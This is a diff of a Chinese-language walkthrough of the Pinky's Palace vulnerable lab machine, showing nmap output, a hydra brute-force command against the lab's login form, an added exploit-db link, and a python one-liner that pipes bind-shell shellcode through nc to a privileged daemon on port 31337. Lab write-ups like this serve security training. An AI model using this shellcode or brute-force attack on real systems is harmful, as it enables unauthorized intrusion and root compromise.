@@ -87,35 +87,6 @@ PORT      STATE SERVICE VERSION
 |     This is soon to be our backdoor
 |     into Pinky's Palace.
 |     HTTP/1.0
-|   HTTPOptions:
-|     [+] Welcome to The Daemon [+]
-|     This is soon to be our backdoor
-|     into Pinky's Palace.
-|     OPTIONS / HTTP/1.0
-|   Help:
-|     [+] Welcome to The Daemon [+]
-|     This is soon to be our backdoor
-|     into Pinky's Palace.
-|     HELP
-|   RTSPRequest:
-|     [+] Welcome to The Daemon [+]
-|     This is soon to be our backdoor
-|     into Pinky's Palace.
-|     OPTIONS / RTSP/1.0
-|   SIPOptions:
-|     [+] Welcome to The Daemon [+]
-|     This is soon to be our backdoor
-|     into Pinky's Palace.
-|     OPTIONS sip:nm SIP/2.0
-|     Via: SIP/2.0/TCP nm;branch=foo
-|     From: <sip:nm@nm>;tag=root
-|     <sip:nm2@nm2>
-|     Call-ID: 50000
-|     CSeq: 42 OPTIONS
-|     Max-Forwards: 70
-|     Content-Length: 0
-|     Contact: <sip:nm@nm>
-|_    Accept: application/sdp
 ```
 
 4655 ssh 端口不允许匿名登陆，也没有提示信息。
@@ -125,9 +96,8 @@ http://pinkydb:7654/login.php 是一个登陆页面，经过尝试不存在 sql 
 可能跟 bambam.txt 有关系，用户名尝试使用 pinkydb、pinky、pinky1337，密码尝试使用 cewl 收集到的，用 hashcat 生成：
 
 ```
-john -rules -wordlist=pass.txt -stdout | tee wordlist.txt
 echo -e "pinkydb\npinky\npinky1337" > user.txt
-hydra -t 20 -L user.txt -P wordlist.txt pinkydb -s 7654 -f http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid Username or Password"
+hydra -t 20 -L user.txt -P pass.txt pinkydb -s 7654 -f http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid Username or Password"
 ```
 
 找到了用户的登陆凭证：pinky:Passione ，登陆系统，看到有两个链接：
@@ -303,6 +273,8 @@ root        452    444  0 00:21 ?        00:00:00 /daemon/panel
 并且 panel 监听了 31337 端口。
 
 经过查找资料，找到了利用这个端口提升到 root 权限的 payload，在 kali 上执行下面 shellcode，在目标机器上开启 5600 监听端口：
+
+https://www.exploit-db.com/exploits/41128
 
 ```
 python2 -c 'print "\x90"*33 + "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05" + "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
